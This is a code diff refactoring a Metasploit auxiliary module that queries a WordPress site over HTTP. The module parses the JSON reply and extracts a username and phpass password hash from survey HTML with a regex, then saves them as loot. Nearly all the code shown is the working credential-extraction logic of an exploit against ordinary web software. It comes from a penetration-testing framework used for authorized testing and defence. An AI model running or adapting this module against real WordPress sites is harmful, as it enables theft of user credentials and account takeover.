@@ -3,8 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'json'
-
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
@@ -66,68 +64,25 @@ class MetasploitModule < Msf::Auxiliary
       'vars_get' => params
     })
 
-    if res && res.code == 200
-      print_good('Received a response from the server!')
+    fail_with(Failure::Unreachable, 'Connection failed') unless res
+    fail_with(Failure::Unknown, 'Unexpected reply from the server') unless res.code == 200
 
-      begin
-        # Parse response body as JSON
-        json_response = JSON.parse(res.body)
+    print_status('Received a response from the server!')
 
-        # Extract 'html' field from JSON
-        html_content = json_response['html']
+    html_content = res.get_json_document['html']
+    fail_with(Failure::Unknown, 'HTML content is empty') unless html_content
 
-        # Extract username
-        username = extract_between(html_content, 'placeholder="Insert a question - Required" value="', '"')
-        # Extract password hash starting with $P$
-        password_hash = extract_password_hash(html_content)
-
-        if username
-          print_good("Extracted Username: #{username}")
-        else
-          print_error('Could not extract username from the response.')
-        end
-
-        if password_hash
-          print_good("Extracted Password Hash: #{password_hash}")
-        else
-          print_error('Could not extract password hash from the response.')
-        end
-
-        print_line('Try setting the SHOW_FULL_RESPONSE variable.') if !username && !password_hash
-
-        # Show full response if extraction fails and the option is enabled
-        if datastore['SHOW_FULL_RESPONSE']
-          print_status("Full Response (HTML):\n#{html_content}")
-        end
-      rescue JSON::ParserError => e
-        print_error("Failed to parse response as JSON: #{e.message}")
-      end
+    # Use regex to extract username and the password hash
+    match_data = /survey_question_p">([^<]+)[^$]+(\$P\$[^"]+)/.match(html_content)
+    if match_data
+      username, password_hash = match_data.captures
+      print_good("Extracted credentials: #{username}:#{password_hash}")
+      store_loot('wordpress.credentials', 'text/plain', rhost, "#{username}:#{password_hash}", 'wp_credentials.txt', 'Extracted WordPress credentials')
     else
-      print_error('No response or unexpected HTTP status code!')
+      print_warning('Could not extract username and password hash. Try enabling SHOW_FULL_RESPONSE.')
+      print_status("Full Response (HTML):\n#{html_content}") if datastore['SHOW_FULL_RESPONSE']
     end
-  end
-
-  # Helper function to extract substring between two markers
-  def extract_between(string, start_marker, end_marker)
-    start_index = string.index(start_marker)
-    return nil unless start_index
-
-    start_index += start_marker.length
-    end_index = string.index(end_marker, start_index)
-    return nil unless end_index
-
-    string[start_index...end_index]
-  end
-
-  # Helper function to extract a password hash starting with '$P$'
-  def extract_password_hash(string)
-    start_index = string.index('$P$')
-    return nil unless start_index
-
-    # Assume the password hash ends at the first whitespace or quote
-    end_index = string.index(/\s|"/, start_index)
-    end_index ||= string.length # If no end marker found, go to the end of the string
-
-    string[start_index...end_index]
+  rescue JSON::ParserError => e
+    fail_with(Failure::UnexpectedReply, "Failed to parse response as JSON: #{e.message}")
   end
 end
